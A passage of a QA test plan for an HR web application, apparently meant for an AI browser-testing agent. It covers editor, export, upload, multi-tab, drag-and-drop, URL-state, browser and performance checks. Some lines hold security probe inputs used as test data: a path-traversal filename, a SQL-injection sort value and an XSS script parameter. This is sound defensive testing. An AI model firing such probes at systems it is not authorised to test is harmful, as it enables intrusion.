click Ordered List → items numbered 1. 2. 3.
assert → nested bullets render correctly (sub-bullets with different marker)
assert → list items can be reordered (drag or keyboard)

# Links
select text → click Link icon → paste URL → confirm
assert → text becomes clickable link in preview
assert → link opens in new tab (target="_blank")
assert → editing link: click linked text → edit URL popup
assert → removing link: select → Unlink → text becomes plain
assert → javascript: links blocked (XSS prevention)

# Tables
insert Table (3×3) → type in cells → navigate with Tab
assert → table renders with borders
assert → add/delete row/column from context menu
assert → table cells support formatting (bold in cell)
assert → table responsive: horizontal scroll on mobile (not breaking layout)

# Code Blocks
insert Code Block → type code → syntax highlighting visible
assert → monospace font (IBM Plex Mono)
assert → code block has copy button
assert → line numbers visible (if supported)
assert → inline code: select text → Code → rendered with bg highlight

# Images (if supported)
insert Image → upload or paste URL → image renders inline
assert → image has alt text field
assert → image resize handles (if supported)
assert → large image auto-constrained to editor width

# Block Quote
select text → click Blockquote → indented with left border
assert → blockquote styling visible in preview

# Horizontal Rule
insert Horizontal Rule → visible divider line renders
assert → divider full width of editor

# Undo/Redo
make 5 edits → Ctrl+Z × 5 → all reverted
Ctrl+Y (or Ctrl+Shift+Z) → re-applies edits
assert → undo history survives focus loss (click outside, click back)

screenshot → tiptap-formatting.png, tiptap-table.png, tiptap-code.png
```

### TIPTAP-2 — Editor Edge Cases & Save Integrity

```
# Content Preservation
type 5000 words of formatted content → Save → reload page
assert → ALL formatting preserved (bold, italic, links, tables, code blocks)
assert → no content truncation
assert → no HTML entity corruption (&amp; instead of &)

# Empty Editor
submit form with empty editor → required field error (if editor is required)
submit form with only whitespace/empty paragraphs → should be treated as empty

# Paste Handling
copy rich text from Google Docs → paste into editor
assert → formatting preserved (bold, italic, lists) but cleaned of Google styles
copy from website → paste → no raw HTML injected
paste plain text → renders as plain paragraph
paste URL → auto-link detection (if enabled)
paste image → uploads and renders inline (if supported)

# Keyboard Shortcuts
Ctrl+B → bold, Ctrl+I → italic, Ctrl+U → underline
Ctrl+Shift+7 → ordered list, Ctrl+Shift+8 → bullet list
Ctrl+K → link insert dialog
assert → shortcuts work within editor focus (don't trigger browser actions)

# Concurrent Editing (if collaborative)
open same wiki page in 2 tabs → edit in both
assert → changes merge without data loss OR last-save-wins with warning

# Performance
paste 10,000 words → editor remains responsive (typing not laggy)
editor with 50 images → scroll smooth (lazy render)
assert → no browser tab crash with large content

screenshot → tiptap-save-integrity.png
```

---

## CROSS-CUTTING TEST SUITE — DATA EXPORT ACCURACY VALIDATION

### EXPORT-1 — Excel/CSV Export Deep Testing

```
# Test for EVERY module that has an Export button
Modules with export: /employees, /attendance, /leave, /payroll, /expenses, /reports, /analytics

For EACH module:

# Export Content Accuracy
apply filters → Export
assert → exported file contains ONLY filtered data (not full dataset)
assert → column count in export matches visible columns on screen
assert → row count in export matches total count shown on screen
assert → first row is header (column names match table headers)
assert → no empty rows at end of file
assert → no "undefined", "null", "[object Object]", "NaN" in any cell
assert → dates formatted consistently in export (DD/MM/YYYY or YYYY-MM-DD, not mixed)
assert → currency amounts have consistent decimal places (2 decimal places)
assert → employee names match screen (not IDs or encoded values)
assert → status values exported as readable text ("Active", not "1" or "true")

# Excel-Specific (.xlsx)
open in Excel or Google Sheets
assert → all columns auto-width (readable without manual resize)
assert → header row frozen (freeze panes)
assert → auto-filter enabled on headers
assert → numeric columns: right-aligned, text: left-aligned
assert → no formula errors (#REF!, #VALUE!, #NAME?)
assert → file opens without corruption warning
assert → sheet name is descriptive ("Employees", not "Sheet1")

# CSV-Specific
open in text editor
assert → UTF-8 encoding (special characters like ñ, ü, ₹ preserved)
assert → comma-separated (not tab or pipe)
assert → values with commas wrapped in quotes ("Smith, John")
assert → no BOM character issues

# Large Dataset Export
navigate → /employees with 500+ records → Export All
assert → export completes (not timeout)
assert → progress indicator shown during export
assert → all 500+ records present in file
assert → rate limit: 6th export within 5min → 429 (Bucket4j: 5/5min)

# PDF Export (payslips, letters, reports)
navigate → /me/payslips → Download PDF
assert → PDF opens without error
assert → employee name, period, amounts correct
assert → company letterhead/logo present
assert → no raw HTML or template variables ({{employee_name}})
assert → PDF file size reasonable (< 2MB for single payslip)
assert → text selectable in PDF (not rasterized image)

screenshot → export-excel.png, export-pdf.png
```

---

## CROSS-CUTTING TEST SUITE — MULTI-TAB & CONCURRENT BROWSER BEHAVIOR

### MULTITAB-1 — Session & State Sync Across Tabs

```
# Same User, Multiple Tabs
login as HRA in Tab A → open Tab B with /employees

Tab A: create employee "QA MultiTab Test"
switch to Tab B → assert → employee appears in list (after refocus/refetch)

Tab A: change dark mode → switch to Tab B
assert → dark mode synced across tabs (if using localStorage listener)

Tab A: logout → switch to Tab B → perform any action
assert → Tab B detects session expired → redirects to /auth/login
assert → no stale data shown in Tab B after logout in Tab A

# Conflicting Edits
Tab A: open /employees/[id] → click Edit
Tab B: open /employees/[id] → click Edit
Tab A: change phone → Save → success
Tab B: change email → Save →
assert → one of:
  (a) optimistic lock: "Record was modified by another user. Refresh and try again" (preferred)
  (b) last-write-wins: both changes saved but Tab A's phone change may be overwritten
  (c) merge: both changes preserved
assert → NEVER silent data loss (Tab A's change vanished without error)

# Notification Sync
Tab A on /dashboard → Tab B on /employees
trigger notification event (leave approval)
assert → notification badge updates in BOTH tabs (WebSocket per-tab)
assert → marking notification read in Tab A → badge clears in Tab B on focus

screenshot → multitab-session-sync.png
```

### MULTITAB-2 — Form State Isolation

```
# Each tab should have independent form state
Tab A: /employees → Add Employee → fill first name "Alice"
Tab B: /employees → Add Employee → fill first name "Bob"
switch to Tab A → assert → form still shows "Alice" (not "Bob")
submit Tab A → "Alice" created
submit Tab B → "Bob" created (not "Alice" duplicate)

# Draft Recovery
Tab A: fill leave form halfway → close tab (without submitting)
open new tab → /leave → Apply Leave
assert → no stale draft data from previous tab (forms start fresh)
  OR: "Recover draft?" prompt if draft persistence is implemented
```

---

## CROSS-CUTTING TEST SUITE — DRAG & DROP DEEP TESTING

### DND-1 — Kanban Pipeline (Recruitment)

```
navigate → /recruitment → click job → pipeline view

# Drag Basics
drag candidate card from "Applied" → drop on "Screening"
assert → card moves to Screening column
assert → card count updates in both columns (Applied -1, Screening +1)
assert → API call: PATCH /api/v*/candidates/[id] → 200
assert → success feedback (toast or subtle animation)
assert → undo available (drag back or toast with Undo)

# Drag Visual Feedback
start drag → assert:
  → dragged card has elevated shadow / opacity change
  → source column shows gap/placeholder
  → valid drop zones highlighted (columns glow or show dashed border)
  → invalid zones (if any) show "not-allowed" cursor
  → drag preview follows cursor smoothly

# Drag Constraints
drag to same column (reorder within stage) → position changes within column
drag to skipped stage (Applied → Offer, skipping Interview) →
  assert → allowed with warning OR blocked per workflow rules
drag "Hired" candidate back to "Applied" →
  assert → blocked or allowed with confirmation ("Reverse pipeline stage?")

# Edge Cases
drag on touch device (375px) → touch-and-hold starts drag
  assert → no conflict with scroll gesture
  assert → drop zone large enough for touch (44px+ targets)
drag while API is slow → optimistic move + rollback on failure
rapid drag: move 5 candidates in quick succession → all moves persist correctly

# Keyboard Alternative
Tab to candidate card → Space/Enter to pick up → Arrow keys to move → Space to drop
assert → screen reader announces: "Picked up [Name]. Use arrows to move. Space to drop."

screenshot → dnd-kanban-drag.png, dnd-kanban-drop.png
```

### DND-2 — List Reorder (Sidebar, Workflow Steps, Checklist Items)

```
# Workflow step reorder (/admin/workflows or approval config)
navigate → workflow definition editor (if drag-reorder supported)
drag step 3 → drop above step 1
assert → order updates: old step 3 is now step 1
assert → step numbers re-index (1, 2, 3, 4)
assert → API persists new order

# Onboarding checklist reorder
navigate → /onboarding → checklist
drag task "IT Setup" above "Document Submission"
assert → order changes, persists on reload

# @hello-pangea/dnd Validation
assert → no console warnings about missing draggableId or droppableId
assert → no "Unable to find drag handle" errors
assert → placeholder element maintains list height during drag (no collapse)
```

---

## CROSS-CUTTING TEST SUITE — BULK IMPORT & FILE UPLOAD DEEP TESTING

### IMPORT-1 — CSV/Excel Bulk Import

```
# Employee bulk import (if feature exists)
navigate → /employees → Import button (or /admin/import)
download template → assert template has correct headers matching employee fields

# Happy Path
fill template: 5 employees with valid data → upload → process
assert → progress bar during import
assert → summary: "5 employees created, 0 errors"
assert → all 5 visible in employee list
assert → audit log: 5 EMPLOYEE_CREATED entries

# Validation Errors
upload file with: duplicate email (row 3), missing required field (row 5), invalid date (row 7)
assert → error report per row:
  Row 3: "Email already exists"
  Row 5: "First name is required"
  Row 7: "Invalid date format"
assert → valid rows (1, 2, 4, 6) imported successfully (partial import)
  OR: all rejected until errors fixed (atomic import)
assert → downloadable error report (CSV with row numbers + error messages)

# File Validation
upload .exe file → "Invalid file type. Please upload .csv or .xlsx"
upload empty file → "File is empty"
upload file with wrong headers → "Column 'FirstName' not found. Expected columns: ..."
upload 10MB+ file → "File too large. Maximum 5MB" (if limit exists)
upload UTF-8 file with special chars (ñ, ü, 日本語) → characters preserved

screenshot → bulk-import-success.png, bulk-import-errors.png
```

### IMPORT-2 — File Upload Across All Modules

```
# Test file upload in EVERY module that accepts files
Modules: expenses (receipt), employees (documents), nu-drive (files), 
         recruitment (resume), training (certificates), tax (proofs)

For EACH upload:

# Upload UX
click upload → file picker opens
select file → progress bar visible during upload
assert → progress bar shows percentage (not indeterminate)
assert → upload button disabled during upload (no double-upload)
completion → file appears in list with name, size, date, type icon

# File Types
upload PDF → accepted, PDF icon shown, preview/download works
upload JPG/PNG → accepted, thumbnail preview generated
upload DOCX → accepted, Word icon shown
upload .exe → rejected: "File type not allowed"
upload .js → rejected (security)

# File Size
upload 1KB file → accepted
upload 5MB file → accepted (within limit)
upload 50MB file → rejected: "File size exceeds 10MB limit" (or appropriate limit)

# File Names
upload "employee résumé (final v2).pdf" → special chars handled
upload "../../etc/passwd" → path traversal sanitized → safe filename stored
upload file with 200-char name → truncated or accepted gracefully

# Download/Preview
click uploaded file → opens preview (PDF in viewer, image in lightbox)
click download button → file downloads with original filename
assert → correct MIME type in response headers
assert → file integrity: downloaded file matches uploaded file (not corrupted)

# Delete
click delete on uploaded file → confirm dialog → file removed
assert → file no longer accessible via direct URL after delete
assert → no orphaned files in MinIO after delete

# MinIO Backend Validation
read_network_requests on upload:
  assert → presigned URL generated: PUT to MinIO endpoint
  assert → file stored with tenant-scoped path (no cross-tenant file access)
  assert → response includes file ID for future retrieval

screenshot → file-upload-progress.png, file-preview.png
```

---

## CROSS-CUTTING TEST SUITE — WEBHOOK & INTEGRATION TESTING

### WEBHOOK-1 — External Integration Points

```
# Google OAuth Integration
navigate → /auth/login → "Sign in with Google"
assert → OAuth redirect URL is correct (not localhost in prod)
assert → OAuth callback handles: success, denial, error
assert → Google profile data (name, email, avatar) correctly mapped to user record

# SMTP Email Delivery
trigger email event (leave approval, password reset, onboarding notification)
navigate → /admin/email-logs (if exists)
assert → email logged with: to, subject, template, status (SENT/FAILED)
assert → template variables resolved (no {{employee_name}} in email body)
assert → HTML email renders correctly (not raw HTML tags)
assert → unsubscribe link present (if marketing emails)

# Twilio SMS (Mocked in Dev)
trigger SMS event (OTP, notification)
assert → mock SMS logged (not actual SMS sent in dev)
assert → phone number formatted correctly in log
assert → SMS content matches expected template

# MinIO File Storage
upload file → verify stored in MinIO
assert → file path includes tenant_id (tenant isolation)
assert → presigned URLs expire after configured TTL
assert → cannot access other tenant's files by guessing URLs
assert → file deletion from UI removes from MinIO (no orphans)

# Elasticsearch Indexing
create wiki page → save → search for title
assert → page appears in search within 5s (near real-time indexing)
delete wiki page → search for title
assert → page no longer in search results (index updated)
assert → re-index operation available for admin (if supported)

# WebSocket STOMP Health
javascript_tool:
  // Monitor WebSocket connection state over 60 seconds
  let disconnects = 0;
  const observer = new MutationObserver(() => {});
  const checkWS = setInterval(() => {
    const ws = window._stompClient;
    if (ws && !ws.connected) { disconnects++; }
  }, 5000);
  setTimeout(() => {
    clearInterval(checkWS);
    console.log('WS disconnects in 60s:', disconnects);
  }, 60000);
assert → 0 disconnects in 60 seconds
assert → auto-reconnect within 10s after manual disconnect simulation
```

---

## CROSS-CUTTING TEST SUITE — URL STATE & DEEP LINKING

### URL-1 — Filter/Sort/Page State in URL

```
# Filters should be reflected in URL for shareability
navigate → /employees
apply filter: Department = "Engineering"
apply filter: Status = "Active"
apply sort: Name (A-Z)
go to page 2

assert → URL now contains: /employees?department=Engineering&status=Active&sort=name&order=asc&page=2
copy URL → open in new tab (same session)
assert → same filters, sort, and page applied (not reset to defaults)
assert → filter badges show "Engineering" and "Active"
assert → page 2 displayed

# URL state survives refresh
press F5 / Ctrl+R → page reloads
assert → all filters, sort, page preserved

# Sharing filtered URL
copy URL → open in incognito → login
assert → after login, redirected to /employees with same filters applied

# Clear filters → URL cleaned
click "Clear All" filters
assert → URL becomes /employees (no stale query params)
assert → URL doesn't accumulate junk params over time

# URL manipulation safety
manually type /employees?page=-1 → assert page defaults to 1 (not error)
manually type /employees?page=99999 → assert shows last page or empty (not 500)
manually type /employees?sort=DROP_TABLE → assert ignored (not SQL injection)
manually type /employees?department=<script>alert(1)</script> → sanitized
```

### URL-2 — Deep Link to Specific Resources

```
# Direct navigation to specific entities
/employees/42 → employee with ID 42 loads (not employee list)
/leave/requests/15 → specific leave request detail
/recruitment/jobs/8/pipeline → specific job's pipeline view
/me/payslips/2026-03 → March 2026 payslip

# Tab state in URL
/employees/42?tab=documents → opens Documents tab directly
/employees/42?tab=employment → opens Employment tab
assert → clicking tabs updates URL hash/param
assert → browser back after tab click → returns to previous tab

# Modal state in URL (if implemented)
/employees?create=true → opens create employee modal directly
/leave?apply=true → opens apply leave modal
assert → closing modal removes param from URL
assert → browser back from modal → modal closes, URL cleans up
```

---

## CROSS-CUTTING TEST SUITE — BROWSER COMPATIBILITY

### BROWSER-1 — Cross-Browser Validation

```
# Test on these browsers (at minimum):
1. Chrome (latest) — primary
2. Firefox (latest) — test CSS differences, form behavior
3. Safari (latest macOS) — test date pickers, flexbox, WebSocket
4. Edge (latest) — Chromium-based, usually matches Chrome

For EACH browser, verify:

# Rendering
assert → layout matches Chrome baseline (no broken flexbox/grid)
assert → fonts load correctly (IBM Plex Sans)
assert → CSS custom properties (--font-sans, etc.) supported
assert → dark mode toggle works
assert → animations smooth (transforms, transitions)

# Forms
assert → date pickers render (native vs Mantine component)
assert → dropdowns open/close correctly
assert → file upload works
assert → form validation messages visible
assert → autofill styling doesn't break layout

# JavaScript
assert → no browser-specific JS errors in console
assert → WebSocket/STOMP connection establishes
assert → Zustand persistence works (localStorage)
assert → React Query cache works

# Safari-Specific Issues
assert → safe-area-inset respected on iPhone (notch/dynamic island)
assert → position: sticky works in Safari (known quirks)
assert → date input doesn't fall back to text (use Mantine DatePicker)
assert → 100vh doesn't include URL bar (use dvh or custom calc)
assert → WebSocket connection stable (Safari has stricter timeout)

# Firefox-Specific Issues  
assert → scrollbar styling applied (Firefox uses scrollbar-width, not ::-webkit-scrollbar)
assert → backdrop-filter: blur() works (may need -webkit- prefix)
assert → grid/flexbox gap renders correctly

screenshot → browser-chrome.png, browser-firefox.png, browser-safari.png
```

---

## CROSS-CUTTING TEST SUITE — PERFORMANCE BENCHMARKS

### PERF-1 — Page Load Time Benchmarks

```
# Measure actual load times for key pages (Network: Fast 3G throttle for consistency)

For EACH of these 10 pages, record:
  /auth/login, /dashboard, /employees, /employees/[id], /leave, /payroll,
  /recruitment, /performance, /admin, /fluence/wiki

javascript_tool:
  const perf = performance.getEntriesByType('navigation')[0];
  const paint = performance.getEntriesByName('first-contentful-paint')[0];
  const lcp = new Promise(resolve => {
    new PerformanceObserver(list => {
      const entries = list.getEntries();
      resolve(entries[entries.length - 1]);
    }).observe({ type: 'largest-contentful-paint', buffered: true });
    setTimeout(() => resolve(null), 10000);
  });
  const lcpEntry = await lcp;
  console.log(JSON.stringify({
    page: location.pathname,
    ttfb: Math.round(perf.responseStart - perf.requestStart),
    fcp: paint ? Math.round(paint.startTime) : null,
    lcp: lcpEntry ? Math.round(lcpEntry.startTime) : null,
    domComplete: Math.round(perf.domComplete),
    loadComplete: Math.round(perf.loadEventEnd),
    transferSize: Math.round(perf.transferSize / 1024) + 'KB'
  }));

Thresholds (file bug if exceeded):
  TTFB: < 800ms (backend response time)
  FCP: < 2000ms (first content visible)
  LCP: < 4000ms (main content visible)
  DOM Complete: < 5000ms
  Transfer Size: < 500KB per page (excluding cached assets)

# API Response Time Audit
read_network_requests for each page load:
  assert → all /api/ calls < 3000ms (flag > 3s as Performance bug)
  assert → no duplicate API calls (same endpoint called twice on load)
  assert → total API calls per page < 15 (too many = N+1 or poor batching)
  log slowest 3 endpoints per page

# Bundle Size Check
javascript_tool:
  const resources = performance.getEntriesByType('resource');
  const jsChunks = resources.filter(r => r.name.endsWith('.js'));
  const totalJS = jsChunks.reduce((sum, r) => sum + (r.transferSize || 0), 0);
  console.log('JS chunks:', jsChunks.length, 'Total JS:', Math.round(totalJS / 1024) + 'KB');
  const largeChunks = jsChunks.filter(r => r.transferSize > 200000);
  if (largeChunks.length) console.log('Large chunks (>200KB):', largeChunks.map(r => r.name.split('/').pop()));

assert → no single JS chunk > 500KB (split needed)
assert → total JS < 2MB (gzipped)
assert → route-based code splitting active (each page loads own chunk)
```

### PERF-2 — Runtime Performance

```
# Scroll Performance
navigate → /employees with 100+ rows
javascript_tool:
  let jankFrames = 0;
  let lastTime = performance.now();
  const observer = () => {
    const now = performance.now();
    if (now - lastTime > 50) jankFrames++; // > 50ms = dropped frame
    lastTime = now;
    requestAnimationFrame(observer);
  };
  requestAnimationFrame(observer);
  // Scroll programmatically
  window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
  setTimeout(() => console.log('Jank frames during scroll:', jankFrames), 3000);
assert → jank frames < 5 during full scroll (smooth 60fps)

# Interaction Responsiveness
click button → measure time to visual feedback
assert → feedback visible within 100ms (button state change, loading indicator)
assert → no input lag on text fields (type "hello" — all 5 chars appear instantly)

# Memory Usage
javascript_tool:
  if (performance.memory) {
    console.log('JS Heap:', Math.round(performance.memory.usedJSHeapSize / 1048576) + 'MB');
    console.log('Heap Limit:', Math.round(performance.memory.jsHeapSizeLimit / 1048576) + 'MB');
  }
navigate → 20 different pages → return to /dashboard
javascript_tool:
  if (performance.memory) {
    console.log('After navigation, JS Heap:', Math.round(performance.memory.usedJSHeapSize / 1048576) + 'MB');
  }
assert → memory growth < 50MB after 20 page navigations (no memory leak)
assert → heap usage < 200MB total (comfortable margin)
```

---

## EXECUTION ORDER (18-Loop Queue)

```
Loop 1:  Auth — login, logout, session, MFA, OAuth, SAML, password policy, RBAC gating, security headers,
         CORS, rate limiting, JWT tampering, cookie security, XSS login, concurrent sessions (all 9 roles)
Loop 2:  Dashboard — widgets, Clock In/Out, real-time notifications, Feed (Post/Poll/Praise), tabs,
         double-click dedup, WebSocket connection validation
Loop 3:  Employees — list, search, create, edit, profile tabs, salary visibility, bulk operations,
         document upload, inline edit validation, IDOR testing, boundary testing, RBAC; Departments CRUD
Loop 4:  Leave — apply, balance, calendar, approve, reject, edge cases (overlap, half-day, zero balance,
         backdated, month-spanning, notice period), RBAC; restricted holidays; LWF
Loop 5:  Attendance — clock-in/out, timesheets, corrections, biometric devices, shifts, overtime
Loop 6:  Payroll — runs, payslips, SpEL formulas, calculation integrity, sensitive data exposure;
         Compensation revisions; Statutory filing; Tax declarations
Loop 7:  Recruitment — pipeline, kanban, interview, offer; Onboarding, Preboarding, Offboarding;
         Offer Portal; Careers (public page); Referrals
Loop 8:  Expenses (multi-currency), Loans, Travel; Assets; Letters (templates); Helpdesk
Loop 9:  Performance, OKR, 360 Feedback, Training; Recognition, Surveys, Wellness; My Space self-service
Loop 10: Admin — roles, permissions, audit log, settings, SAML IdP, restricted holidays, feature flags,
         ShedLock jobs; Redis cache validation; Audit trail completeness check
Loop 11: Global nav deep — sidebar (collapse/expand/persist/tooltips/badges), app switcher (panel/routing),
         header (avatar dropdown/breadcrumbs/sticky), global search (⌘K results/keyboard nav/edge cases),
         notifications bell (real-time/types/overflow/scroll), page transitions, 404 page
Loop 12: UI/UX deep — dark mode (30-point component audit + color contrast scan), responsive (6 breakpoints
         incl 1440/1024/landscape), typography (font loading/hierarchy/number formatting/truncation),
         color system (purple→sky migration check + semantic colors + badge audit), spacing grid (8px
         enforcement), icon consistency, empty states, scroll/overflow, print styles, micro-interactions
         (hover/press/dropdown/toggle/accordion/drag-drop/counter animations)
Loop 13: UI/UX consistency audit — visual regression baseline (15 pages × light + dark), component
         consistency (buttons/cards/tables/forms/badges across 5 modules each), interaction pattern
         consistency (create/edit/delete/approval flows), whitespace & hierarchy, loading & perceived
         performance (skeleton fidelity, progressive/optimistic loading), error state UX (partial errors,
         form errors, reconnection), feedback patterns (success/destructive/bulk/undo), navigation &
         wayfinding (deep linking, 404 prevention), avatar/image handling, chart quality
Loop 14: Tiptap & Rich Content — editor formatting (bold/italic/headings/lists/links/tables/code blocks),
         paste handling, keyboard shortcuts, save integrity, empty editor, concurrent editing, large content
Loop 15: Data Export & Import — Excel/CSV export accuracy (all modules), PDF export (payslips/letters),
         export rate limiting, bulk CSV import (employee/attendance), file upload across all modules
         (type/size/name validation, MinIO backend, download integrity)
Loop 16: Infrastructure — Kafka DLQ, Elasticsearch indexing/search, MinIO upload/download, WebSocket/STOMP
         health (60s stability), email/SMS delivery, scheduled jobs; Fluence routes; webhook/integration
         testing (OAuth, SMTP, Twilio mock, ES index sync)
Loop 17: Cross-cutting — E2E lifecycle workflows (hire-to-retire, expense-to-payroll, leave-to-payroll),
         approval chain delegation, form/modal/table/toast validation, multi-tab concurrent behavior
         (session sync, conflicting edits, form isolation), drag-and-drop deep (kanban + reorder),
         URL state & deep linking (filter/sort/page in URL, tab state, modal state)
Loop 18: Security & Performance — XSS stored/reflected, URL parameter injection, IDOR across all modules,
         Zustand + React Query cache validation, Redis cache consistency, browser compatibility
         (Chrome/Firefox/Safari/Edge), page load benchmarks (TTFB/FCP/LCP per 10 pages), runtime
         performance (scroll jank, memory leaks, bundle size audit)
```

After every loop: run accessibility + responsive pass → generate partial Excel report.

---

## IMPORTANT NOTES

- Tools: `navigate`, `find`, `computer`, `form_input`, `read_page`, `read_console_messages`, `read_network_requests`, `javascript_tool`, `gif_creator`, `resize_window` (Claude in Chrome MCP)
- **Always screenshot every bug.** GIF every Critical/High bug.
- Clear console + network buffers between pages.
- Skip gracefully if module has no test data — note as "Skipped — no data" in coverage sheet.
- Excel report is the primary deliverable — produce even if testing is cut short (add Infrastructure sheet).
- **Design system rules:** loading states use `NuAuraLoader` / `SkeletonTable` / `SkeletonStatCard` / `SkeletonCard` (never plain spinner); empty states use `<EmptyState>` component (never blank page); spacing uses 8px grid (banned: `gap-3 p-3 p-5`); no hardcoded hex colors (use CSS variables).
- **MY SPACE routes** (`/me/*`) must always be accessible to all authenticated users — never gate them. File Critical bug if any role is blocked from their own self-service pages.
- **Feature flags** (12 flags: `enable_payroll`, `enable_performance`, `enable_documents`, `enable_helpdesk`, `enable_lms`, `enable_wellness`, `enable_projects`, `enable_timesheets`, `enable_fluence`, `enable_google_drive`, `enable_payments`, `enable_ai_recruitment`) are all seeded on the demo tenant. Note: `enable_google_drive` and `enable_ai_recruitment` default to **disabled** — others default to enabled. A 403 with feature flag message on an enabled flag = bug.
- **Rate limiting:** Auth endpoint = 5 req/min (wait ~15s between role-cycling). Export endpoint = 5 per 5min. API general = 100/min. Social = 30/min. A 429 on any unlisted endpoint = unexpected throttle bug.
- **Flyway:** V0–V103 active (100 migrations). Notable features: LWF (V82), letter templates (V83), SAML IdP (V84), restricted holidays (V85), biometric devices (V86), statutory filing (V87), expense extensions (V88), shift management (V89), RLS corrections (V90), ShedLock (V91), V92–V103 (payroll processing, AI recruitment, training/skill mappings, etc.). All must be tested.
- **WebSocket:** Dashboard and notifications use STOMP over SockJS at `/ws`. Always verify connection active before testing real-time features.
- **ShedLock (V91):** Distributed job locking prevents duplicate scheduled job runs. Verify no ERROR logs from ShedLock timeouts.
- **Tiptap (rich text):** Used in wiki, blogs, letters, announcements. Test bold/italic/heading/table/code block/link in any Tiptap editor. Verify content renders correctly after save.
